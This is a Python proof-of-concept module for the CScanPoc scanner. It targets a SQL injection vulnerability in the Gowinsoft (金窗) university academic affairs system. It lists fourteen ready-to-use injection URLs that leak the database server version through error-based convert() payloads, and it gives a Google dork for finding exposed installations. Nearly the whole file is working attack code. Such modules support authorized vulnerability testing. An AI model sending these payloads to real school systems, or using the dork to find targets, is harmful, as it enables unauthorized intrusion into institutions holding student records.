# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Gowinsoft_0001'  # 平台漏洞编号，留空
    name = '金窗教务系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-16'  # 漏洞公布时间
    desc = '''
        金窗教务管理系统是为高校数字校园建设提供的技术解决方案。 
        金窗教务管理系统通用型SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=128788、0121349、0101234、0101741'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金窗教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版


class Poc(ABPoc):
    poc_id = 'c691e5de-493c-4507-8511-52f6bc1d30c7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            '''
            name: 金窗教务系统多处注入
            author: yichin
            refer:
                http://www.wooyun.org/bugs/wooyun-2015-0128788
                http://www.wooyun.org/bugs/wooyun-2010-0121349
                http://www.wooyun.org/bugs/wooyun-2010-0101234
                http://www.wooyun.org/bugs/wooyun-2010-0101741
            description:
                google dork: inurl:web/web/lanmu
                ...
            '''
            hh = hackhttp.hackhttp()
            payloads1 = [
                self.target +
                '/web/web/lanmu/wenzhaishow.asp?id=44%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27abc%27=%27abc',
                self.target +
                '/web/web/web/showfj.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/jiu/yjxianshihui.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/jiu/gongwenshow.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/lanmu/gongwenshow.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/wenzhai/lanmushow.asp?lei=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/xx/yjxianshihui.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/bao/list.asp?bh=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/shizi/shizi/textbox.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/sj/shixi/biyeshan1.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/xueji/dangan/sdangangai1.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/xueji/shen/autobh.asp?jh=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/xueji/zhuce/iszhuce.asp?xuehao=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/xueji/xueji/dealfxue.asp?cmdok=1&id=1%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))',
            ]
            for payload in payloads1:
                code, head, res, err, _ = hh.http(payload)
                if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
                    #security_hole('SQL injection: ' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
